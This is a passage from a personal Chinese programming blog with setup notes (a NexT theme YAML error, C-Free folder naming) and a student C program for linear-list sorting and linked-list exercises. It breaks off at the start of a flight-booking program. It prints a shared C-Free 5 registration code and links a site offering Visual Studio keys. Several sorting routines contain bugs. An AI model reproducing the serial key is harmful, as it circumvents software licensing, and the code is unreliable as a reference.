class="headerlink" title="next主题倒腾"></a>next主题倒腾</h2><p>官方文档:<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">点击进入</a></p><p>报错解决：</p><blockquote><p>ENOENT: no such file or directory, open ‘D:\ myBlog\ themes\ next\ layout\ scripts\ schemes. swig’</p></blockquote><p>原因是配置文件 <code>_config.yml</code>有问题，我这是友情链接<code>：</code>后没空格的原因</p><p><a href="https://liaocy.net/2018/20180621-yamlvalidator/" target="_blank" rel="noopener">参考文章</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="图片在线设计"><a href="#图片在线设计" class="headerlink" title="图片在线设计"></a>图片在线设计</h3><p>感谢专业大神<code>orangice</code>的指导</p><p>在线图片设计fotor:<a href="https://www.fotor.com/cn/" target="_blank" rel="noopener">地址</a></p><h3 id="visual-studio-2012-安装"><a href="#visual-studio-2012-安装" class="headerlink" title="visual studio 2012 安装"></a>visual studio 2012 安装</h3><p>推荐一个高速下载还提供密钥的站点：<a href="https://www.nocang.com/visual-studio-ultimate-2012/" target="_blank" rel="noopener">点击进入</a></p><h3 id="C-Free-5下载"><a href="#C-Free-5下载" class="headerlink" title="C-Free 5下载"></a>C-Free 5下载</h3><p>下载网址：<a href="http://www.programarts.com/cfree_ch/" target="_blank" rel="noopener">点击进入</a></p><h4 id="注册码"><a href="#注册码" class="headerlink" title="注册码:"></a>注册码:</h4><p>用户名：<code>tianfang</code><br>邮箱：<a href="mailto:`quart@163.com" target="_blank" rel="noopener">`quart@163.com</a><code>注册码：</code>2NnUqd3shO2agta0xNjcusfK1LXO`</p><p><a href="https://zhidao.baidu.com/question/348880357.html" target="_blank" rel="noopener">参考文章</a></p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>C-Free 5安装好后记得改文件夹名把中间的空格去掉，否则会报以下错误</p><blockquote><p>[Error] g++.exe: 5\mingw\lib\: No such file or directory</p><p>[Error] g++.exe: 5\mingw\mingw32\lib\: No such file or directory</p><p>[Error] g++.exe: 5\mingw\bin\: No such file or directory</p><p>[Error] g++.exe: 5\mingw\mingw32\bin\: No such file or directory</p></blockquote><p><a href="https://blog.csdn.net/qq_34781336/article/details/79260427" target="_blank" rel="noopener">参考文章</a></p><h2 id="C程序"><a href="#C程序" class="headerlink" title="C程序"></a>C程序</h2><h3 id="线性表综合题"><a href="#线性表综合题" class="headerlink" title="线性表综合题"></a>线性表综合题</h3><blockquote><p>1.按照输入的顺序建立顺序表<br>2.对顺序表进行排序（直接插入、冒泡、选择、快速、合并)<br>3.按照由大到小的顺序建立一个单链表<br>4.链表逆置<br>5.将顺序表和链表合并成一个有序表。<br>6.结果输出</p></blockquote><p><a href="https://www.write-bug.com/article/1630.html" target="_blank" rel="noopener">解题思路和函数调用图参考</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/*链表节点*/</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">100</span>];    <span class="comment">/*线性表用数组存储*/</span></span><br><span class="line"><span class="keyword">int</span> count;    <span class="comment">/*顺序表计数器*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createList</span> <span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*建立顺序表*/</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顺序表长度："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;count);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顺序表第%d节点数据:"</span>,i);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printList</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*打印顺序表*/</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;   <span class="comment">/*打印排序结果*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*排序列表*/</span></span><br><span class="line">    <span class="keyword">int</span> M = <span class="number">1</span>, N = count, i, ch;<span class="comment">/*建立快速，归并排序所需数组*/</span></span><br><span class="line">    <span class="keyword">int</span> r1[N + <span class="number">1</span>], r2[N + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= N; i++) &#123;</span><br><span class="line">        r1[i - <span class="number">1</span>] = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//system("CLS");</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1.直接插入排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"2.冒泡排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"3.直接选择排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"4.快速排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"5.归并排序\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入你的选择："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;ch);</span><br><span class="line">    <span class="keyword">switch</span>(ch) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:insertSort(arr);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:bubbleSort(arr);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:selectionSort(arr);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:quickSort(arr, M, N);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:mergeSort(r1, r2, <span class="number">0</span>, N - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= N; i++) &#123;</span><br><span class="line">                arr[i] = r1[i - <span class="number">1</span>];</span><br><span class="line">        &#125;<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*直接插入排序*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        arr[<span class="number">0</span>] = arr[i];    <span class="comment">/*array[0]作为监督哨*/</span></span><br><span class="line">        j = i - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (arr[<span class="number">0</span>] &lt; arr[j]) &#123;    <span class="comment">/*从后向前找到第一个关键字不小于arr[0]的记录*/</span></span><br><span class="line">            arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    arr[j + <span class="number">1</span>] = arr[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*冒泡排序*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= count - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">selectionSort</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*直接选择排序*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j, temp, m;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        m = i;</span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt;= count; j++) &#123;    <span class="comment">/*找到最小的数字*/</span></span><br><span class="line">            <span class="keyword">if</span>(arr[j] &lt; arr[m]) &#123;</span><br><span class="line">                m = j;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (i != m) &#123;</span><br><span class="line">            temp = arr[i];</span><br><span class="line">            arr[i] = arr[m];</span><br><span class="line">            arr[m] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> M, <span class="keyword">int</span> N)</span> </span>&#123;    <span class="comment">/*快速排序*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j, x;</span><br><span class="line">    i = M, j = N;</span><br><span class="line">    x = arr[i];</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> ((arr[j] &gt;= x) &amp;&amp; (j &gt; i)) &#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                arr[i] = arr[j];</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">while</span> (arr[j] &lt;= x &amp;&amp; (i &lt; j)) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                    arr[j] = arr[i];</span><br><span class="line">                    j--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span> (i != j);</span><br><span class="line">    arr[i] = x;</span><br><span class="line">    i++;</span><br><span class="line">    j--;</span><br><span class="line">    <span class="keyword">if</span> (M &lt; j) &#123;</span><br><span class="line">        quickSort(arr, M ,j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; N) &#123;</span><br><span class="line">        quickSort(arr, i, N);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> r[], <span class="keyword">int</span> r2[], <span class="keyword">int</span> S, <span class="keyword">int</span> M, <span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,k,j;</span><br><span class="line">    i = S, k = S, j = M + <span class="number">1</span>;    <span class="comment">/*从S开始*/</span></span><br><span class="line">    <span class="keyword">while</span> ((i != M + <span class="number">1</span>) &amp;&amp; (j != N + <span class="number">1</span>)) &#123;    <span class="comment">/*当两个表都有内容未排完时*/</span></span><br><span class="line">        <span class="keyword">if</span> (r[i] &gt; r[j]) &#123;</span><br><span class="line">            r2[k] = r[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r2[k] = r [i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i != M + <span class="number">1</span>) &#123;    <span class="comment">/*将剩下的全部放入*/</span></span><br><span class="line">        r2[k++] = r[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j != N + <span class="number">1</span>) &#123;</span><br><span class="line">        r2[k++] = r[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = S; i &lt;= N; i++) &#123;</span><br><span class="line">        r[i] = r2[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> r[], <span class="keyword">int</span> r2[], <span class="keyword">int</span> S, <span class="keyword">int</span> N)</span> </span>&#123;    <span class="comment">/*归并排序*/</span></span><br><span class="line">    <span class="keyword">int</span> M;</span><br><span class="line">    <span class="keyword">if</span> (S &lt; N) &#123;</span><br><span class="line">        M = (S + N)/<span class="number">2</span>;</span><br><span class="line">        mergeSort(r, r2, S, M);</span><br><span class="line">        mergeSort(r, r2, M + <span class="number">1</span>, N);</span><br><span class="line">        merge(r, r2, S, M, N);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createNode</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*建立链表*/</span></span><br><span class="line">    Node *q;</span><br><span class="line">    <span class="keyword">int</span> m, n, i;    <span class="comment">/*节点个数为m，节点数据为n*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入链表节点个数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        q = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入第%d节点数据："</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">        q -&gt; data = n;</span><br><span class="line">        L -&gt; next = q;</span><br><span class="line">        L = q;</span><br><span class="line">    &#125;</span><br><span class="line">    L -&gt; next = <span class="literal">NULL</span>;    <span class="comment">/*尾标识为NULL*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sortNode</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*对链表节点进行排序，仅交换数据*/</span></span><br><span class="line">    <span class="keyword">int</span> i, j, tempData;</span><br><span class="line">    Node *head, *point;    <span class="comment">/*辅助指针point帮助指向head的下一个节点*/</span></span><br><span class="line">    head = L;</span><br><span class="line">    head = head -&gt; next;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (head -&gt; next != <span class="literal">NULL</span>) &#123;    <span class="comment">/*计算链表长度*/</span></span><br><span class="line">        head = head -&gt; next;</span><br><span class="line">        length++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;    <span class="comment">/*冒泡排序*/</span></span><br><span class="line">        head = L;    <span class="comment">/*将head复位*/</span></span><br><span class="line">        head = head -&gt; next;</span><br><span class="line">        <span class="keyword">for</span>(j = i; j &lt; length; j++) &#123;</span><br><span class="line">            point = head -&gt; next;</span><br><span class="line">            <span class="keyword">if</span>(head -&gt; data &gt;= point -&gt; data) &#123;</span><br><span class="line">                tempData = head -&gt; data;</span><br><span class="line">                head -&gt; data = point -&gt; data;</span><br><span class="line">                point -&gt; data = tempData;</span><br><span class="line">            &#125;</span><br><span class="line">            head = head -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    head = L;    <span class="comment">/*指针回到开头*/</span></span><br><span class="line">    head = head -&gt; next;</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="literal">NULL</span>) &#123;    <span class="comment">/*将排序后的线性表显示出来*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, head -&gt; data);</span><br><span class="line">        head = head -&gt; next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">combine</span><span class="params">(<span class="keyword">int</span> arr[], Node *L2)</span> </span>&#123;    <span class="comment">/*结合两张表*/</span></span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        a[i - <span class="number">1</span>] = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (L2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        a[count] = L2 -&gt; data;</span><br><span class="line">        count++;</span><br><span class="line">        L2=L2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= count - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[j] &gt; a[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = a[j + <span class="number">1</span>];</span><br><span class="line">                a[j + <span class="number">1</span>] = a[j];</span><br><span class="line">                a[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;count<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choose;</span><br><span class="line">    Node *L2;</span><br><span class="line">    L2 = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.建立顺序表\n"</span>);</span><br><span class="line">        createList(<span class="built_in">array</span>);printList(<span class="built_in">array</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.顺序表排序\n"</span>);</span><br><span class="line">        sort(<span class="built_in">array</span>);printList(<span class="built_in">array</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3.建立链表\n"</span>);</span><br><span class="line">        createNode(L2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"4.逆置链表\n"</span>);</span><br><span class="line">        sortNode(L2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"5.合并顺序表与链表\n"</span>);</span><br><span class="line">        combine(<span class="built_in">array</span>,L2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="飞机票预订系统"><a href="#飞机票预订系统" class="headerlink" title="飞机票预订系统"></a>飞机票预订系统</h3><p>可在同一文件夹下创建Customer.txt文件存储信息。不过用来读取信息不能实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 